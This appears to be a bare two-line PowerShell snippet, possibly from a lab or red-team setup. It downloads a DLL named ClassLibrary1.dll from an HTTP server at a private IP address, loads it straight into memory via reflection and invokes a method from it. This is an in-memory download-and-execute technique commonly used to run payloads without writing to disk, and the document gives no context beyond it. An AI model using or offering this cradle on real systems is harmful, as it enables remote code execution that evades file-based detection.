[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://192.168.154.200:8000/ClassLibrary1.dll"))
[TestLibrary.TestClass]::work()
